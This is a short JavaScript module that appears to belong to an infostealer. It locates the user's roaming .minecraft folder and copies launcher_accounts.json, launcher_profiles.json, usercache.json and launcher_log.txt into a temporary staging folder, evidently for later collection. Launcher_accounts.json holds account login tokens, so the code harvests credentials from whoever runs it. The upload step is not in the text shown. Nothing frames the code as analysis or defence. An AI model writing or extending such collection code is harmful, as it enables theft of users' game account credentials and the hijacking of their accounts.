const { roamingAppData } = require('../util/variables');
const { join } = require('path');
const fs = require('fs');
const { tempFolder } = require('../index');

const path = join(roamingAppData, '.minecraft');
fs.mkdirSync(join(tempFolder, 'Minecraft'));
const files = ['launcher_accounts.json', 'launcher_profiles.json', 'usercache.json', 'launcher_log.txt'];

files.forEach(file => {
  if (fs.existsSync(join(path, file))) {
    fs.copyFileSync(join(path, file), join(tempFolder, 'Minecraft', file));
  }
});
